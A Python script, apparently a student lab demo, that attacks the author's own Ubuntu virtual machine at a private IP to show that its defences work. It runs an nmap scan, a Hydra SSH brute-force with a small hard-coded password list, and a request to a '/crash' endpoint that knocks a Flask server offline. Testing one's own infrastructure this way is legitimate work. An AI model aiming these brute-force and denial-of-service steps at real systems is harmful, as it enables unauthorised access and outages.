import msvcrt
import subprocess
import requests
import urllib3
import os
import msvcrt

# Disable warnings related to self-signed HTTPS certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_IP = "192.168.137.6" # ⚠️ REPLACE WITH YOUR UBUNTU IP
SSH_USER = "starmooc"        # ⚠️ REPLACE WITH YOUR SSH USER

def print_header(title):
    print(f"\n{'-'*75}\n>> {title}\n{'-'*75}")

def wait_for_user():
    input("\n[⏳] Press ENTER to launch the next attack...")

# --- 1. RECONNAISSANCE & SURICATA ---
# --- 1. RECONNAISSANCE & SURICATA ---
def test_nmap_scan():
    print_header("NMAP RECONNAISSANCE : VÉRIFICATION DES PORTS OUVERTS")
    print(f"[*] Scanning {TARGET_IP} to check for unprotected ports...")

    try:
        # L'option --open permet de n'afficher que les ports où un pirate peut entrer
        # L'option -T4 accélère le scan pour ta démo
        # Utilisation de la détection de services (-sV) et détection de version
        result = subprocess.run(["nmap", "-F", "-T4", TARGET_IP], capture_output=True, text=True)
        print("\n[!] PORTS DÉTECTÉS COMME OUVERTS :")
        found = False
        for line in result.stdout.split('\n'):
            if "/tcp" in line:
                print(f"    >>> {line.strip()}")
                found = True
        
        if not found:
            print("[🛡️] AUCUN PORT OUVERT DÉTECTÉ (Pare-feu actif)")
            
    except FileNotFoundError:
        print("[-] ERROR: Nmap n'est pas installé sur cette machine.")

# --- 2. BRUTE FORCE & FAIL2BAN ---
def test_ssh_brute_force():
    import time    # Safe local import to prevent NameError
    import msvcrt  # Safe local import for keypress detection
    
    print_header("SSH BRUTE FORCE ATTACK")
    
    # Define the directory where the script and the exe are located
    base_dir = r"C:\Users\liene\Documents\INSA\S8\KR_Course\Advanced Computer Networking\Projet\Attack"
    pass_file_path = os.path.join(base_dir, "pass_demo.txt")
    hydra_exe = os.path.join(base_dir, "hydra.exe")
    
    # Create the password file with absolute path using strict LF line endings
    with open(pass_file_path, "w", newline="\n") as f:
        f.write("12345\npassword\nroot\nadmin\nqwerty\nubuntu\nLetmeIn\n123456789!\nPlease\n")
    print(f"[*] Launching Hydra against {TARGET_IP}...")
    print("[⌨️] PRESS 'ENTER' AT ANY TIME TO SKIP THIS ATTACK AND MOVE FORWARD.")
    
    # Launch Hydra as a background process tree
    process = subprocess.Popen(
        [hydra_exe, "-l", "starmooc", "-P", pass_file_path, "-t", "1", "-V", f"ssh://{TARGET_IP}"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    
    user_skipped = False
    
    try:
        # Monitoring loop: Runs as long as Hydra is active
        while process.poll() is None:
            # Check if a keypress is waiting in the buffer
            if msvcrt.kbhit():
                key = msvcrt.getch()
                # Check if the pressed key is 'Enter' (\r or \n in Windows byte format)
                if key in (b'\r', b'\n'):
                    print("\n[*] User skip detected! Obliterating Hydra process tree...")
                    os.system(f"taskkill /F /T /PID {process.pid} >nul 2>&1")
                    user_skipped = True
                    break
            # Tiny sleep interval to prevent 100% CPU core consumption while polling
            time.sleep(0.1)
            
        if user_skipped:
            print("[🛡️] Attack skipped by user interaction. Progressing to the next sequence.")
        else:
            # Hydra finished naturally, safely read the outputs
            stdout, stderr = process.communicate()
            output = stdout + stderr
            output_lower = output.lower()
            
            # Case-insensitive matching to reliably catch server responses
            if "login:" in output_lower and "password:" in output_lower:
                found_pass = output.split('password:')[1].split()[0]
                print(f"\n[🚨] Password found! The password is: {found_pass}")
            elif "refused" in output_lower or "timeout" in output_lower or "failed" in output_lower:
                print("\n[🛡️] The connection was dropped or refused by the server (Fail2Ban active).")
            else:
                print("\n[-] The attack ended. Moving to the next step.")
                
    except Exception as e:
        print(f"[-] ERROR executing Hydra: {e}")
        if process.poll() is None:
            os.system(f"taskkill /F /T /PID {process.pid} >nul 2>&1")
    finally:
        if os.path.exists(pass_file_path): 
            os.remove(pass_file_path)
# --- 3. DENIAL OF SERVICE (DOS) & DOCKER AUTO-HEAL ---
def test_dos_and_autoheal():
    print_header("APPLICATION CRASH (DoS)")
    print("[*] Sending the malicious payload (/crash) to bring down the Flask server...")
    
    # We attack port 5000 if UFW is off, otherwise port 443
    target_url_http = f"http://{TARGET_IP}:5000/crash"
    target_url_https = f"https://{TARGET_IP}/crash"
    
    try:
        requests.get(target_url_http, timeout=1)
    except:
        try:
            requests.get(target_url_https, verify=False, timeout=1)
        except:
            pass # The crash always causes a connection error, this is normal
            
    print("\n[💥] PAYLOAD SENT: The Server is down and the process was violently killed!")

if __name__ == "__main__":
    print("\n" + "="*75)
    print(r"   ___  _   _             _           _____           _       _    ")
    print(r"  / _ \| | | |           | |         /  ___|         (_)     | |   ")
    print(r" / /_\ \ |_| |_ __ _  ___| | __      \ `--.  ___ _ __ _ _ __ | |_  ")
    print(r" |  _  | __| __/ _` |/ __| |/ /       `--. \/ __| '__| | '_ \| __| ")
    print(r" | | | | |_| || (_| | (__|   <       /\__/ / (__| |  | | |_) | |_  ")
    print(r" \_| |_/\__|\__\__,_|\___|_|\_\      \____/ \___|_|  |_| .__/ \__| ")
    print(r"                                                     | |         ")
    print(r"                                                     |_|         ")
    print("="*75)
    
    wait_for_user()
    test_nmap_scan()
    
    print_header("Clarity Test")

    wait_for_user()
    test_ssh_brute_force()
    
    wait_for_user()
    test_dos_and_autoheal()
    
    print("\n" + "="*75)
    print_header(" END OF INFRASTRUCTURE AUDIT")
    print("="*75)